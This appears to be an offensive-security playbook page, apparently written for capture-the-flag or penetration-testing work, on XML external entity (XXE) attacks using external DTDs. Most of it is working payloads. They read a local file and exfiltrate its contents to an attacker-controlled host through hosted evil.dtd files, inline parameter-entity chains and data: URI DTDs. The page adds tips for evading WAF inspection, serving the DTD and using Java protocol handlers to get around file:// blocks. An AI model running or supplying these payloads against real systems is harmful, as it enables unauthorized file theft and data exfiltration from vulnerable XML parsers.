# External DTD — hosting the attack logic

## The two-file pattern — minimal inline + logic on your host

Target document stays tiny:

```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % d SYSTEM "http://YOUR-HOST/evil.dtd">
  %d;
]>
<r>&x;</r>
```

Your `evil.dtd` carries the real machinery — file-read + exfil
composition, entity chains, error-coercion. Keeping the inline part
small dodges WAF inspection and DOCTYPE-size limits.

## The standard evil.dtd — file-read + URL exfil

```xml
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://YOU/?d=%file;'>">
%eval;
%send;
```

Wait — inside an external DTD you can't use `%` literally inside an
entity value (it expands). `&#x25;` is `%` — hence the
`&#x25; send` form. The escaped `%` inside `eval`'s value becomes a
literal `%` when `eval` expands → `%send;` declaration.

## Self-contained variant — no separate file needed on target

The target doc carries ALL the machinery inline, but param-entity
nesting inside an entity VALUE is forbidden in the internal subset —
the workaround:

```xml
<!DOCTYPE r [
  <!ENTITY % a "<!ENTITY b 'val'>">
  %a;
]>
<r>&b;</r>
```

is legal in lenient parsers but spec-forbidden in strict — the
external-DTD form is the portable answer.

## Three DTD shapes ranked by reliability

| Shape | Inline | External DTD does |
|---|---|---|
| A: external subset | `<!DOCTYPE r SYSTEM "http://YOU/d.dtd">` | everything |
| B: param-entity import | `%d;` after `<!ENTITY % d SYSTEM "...">` | declares `&exfil;` etc. |
| C: inline-internal-composition | nested param entities inline | needs no external DTD at all |

Shape C (works when param-entity nesting inside internal subset is
allowed by the parser — libxml2 yes, Java SAX yes):

```xml
<!DOCTYPE r [
  <!ENTITY % file SYSTEM "file:///flag">
  <!ENTITY % enc "<!ENTITY exfil SYSTEM 'http://YOU/?d=%file;'>">
  %enc;
]>
<r>&exfil;</r>
```

Try C first — no listener needed for the DTD itself (only for the
exfil hit). If the parser refuses inline param-entity-in-value → shape B.

## Hosting the DTD — the listener side

`tools/web/oob_listener.py serve --port 8000 --log hits.jsonl` — HTTP
listener that logs every request line — the exfil URL hits are your
evidence + data channel.

For a static-DTD fetch you need the DTD SERVED — `serve` logs hits but
doesn't answer 200 with content. Options:

- run `python3 -m http.server 8000` in a dir containing `evil.dtd`
- or ask the listener — check if `serve` has a `--respond`/`--file`
  option (check `--help`); if not, `python3 -m http.server` is the
  stdlib answer
- or embed the DTD as a `data:` URI inside the target doc:

```xml
<!ENTITY % dtd SYSTEM "data:text/plain,<!ENTITY %25 exfil SYSTEM 'http://YOU/?d=%25file;'>">
%dtd;
```

The `data:` URI trick avoids hosting entirely — `%25` = `%` encoded so
the inner param-entity syntax survives the URL.

## The data:-URI DTD — the no-listener exfil

```xml
<!DOCTYPE r [
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % dtd SYSTEM "data:text/plain,<!ENTITY &#x25; e SYSTEM 'http://YOU/?d=%25file;'>">
%dtd;
%e;
]>
<r>&e;</r>
```

Wait — the `data:` URI text needs `%25` for literal `%`, and the
`&#x25;` form in the URI. The exact encoding is fiddly; the
external-DTD-on-http.server approach is more reliable in practice.

## Java-specific — `netdoc:`/`jar:` protocols

Java's URL handlers allow `netdoc:///path` (≈file) and
`jar:http://x!/file` — useful when `file://` is blocked —
`protocol-handlers.md`.

## Falsifiers

- parser refuses external DTDs (`DOCTYPE`/`SYSTEM` rejected) —
  try XInclude, or the error-channel-only paths

## Output to record

- the verbatim exfil URL hit (contains the file content) + which DTD
  shape worked
